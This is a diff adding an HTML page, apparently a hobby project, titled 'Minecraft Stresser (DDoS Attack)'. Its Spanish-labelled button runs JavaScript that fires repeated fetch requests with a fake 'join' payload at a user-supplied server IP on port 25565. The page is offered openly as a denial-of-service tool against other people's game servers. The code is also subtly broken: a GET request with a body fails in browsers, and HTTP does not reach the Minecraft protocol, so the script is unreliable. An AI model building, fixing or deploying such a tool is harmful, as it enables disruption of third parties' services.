@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Minecraft Stresser</title>
+  <style>
+    body {
+      background-color: #000000;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+    }
+    input {
+      padding: 10px;
+      font-size: 1em;
+      margin: 20px 0;
+      border: 2px solid #ff66b2;
+      border-radius: 5px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 1em;
+      color: #ffffff;
+      background-color: #ff66b2;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #ff3399;
+    }
+    p {
+      font-size: 1.2em;
+      margin: 20px 0;
+    }
+  </style>
+</head>
+<body>
+  <h1>Minecraft Stresser (DDoS Attack)</h1>
+  <input type="text" id="serverIp" placeholder="IP del servidor">
+  <button onclick="startStress()">Iniciar Ataque DDoS</button>
+  <p id="message"></p>
+
+  <script>
+    async function startStress() {
+      const serverIp = document.getElementById('serverIp').value;
+      const numberOfRequests = 100; // Aumenta el número de solicitudes
+      const interval = 1000; // Intervalo en milisegundos entre cada solicitud
+      const playerName = 'j0vi1An';
+      let messageElement = document.getElementById('message');
+
+      messageElement.textContent = 'Enviando solicitudes...';
+
+      try {
+        for (let i = 0; i < numberOfRequests; i++) {
+          await fetch(`http://${serverIp}:25565`, {
+            method: 'GET',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              action: 'join',
+              name: playerName,
+            }),
+          });
+          await new Promise(resolve => setTimeout(resolve, interval));
+        }
+        messageElement.textContent = `Enviadas ${numberOfRequests} solicitudes.`;
+      } catch (error) {
+        messageElement.textContent = `Error: ${error.message}`;
+      }
+    }
+  </script>
+</body>
+</html>
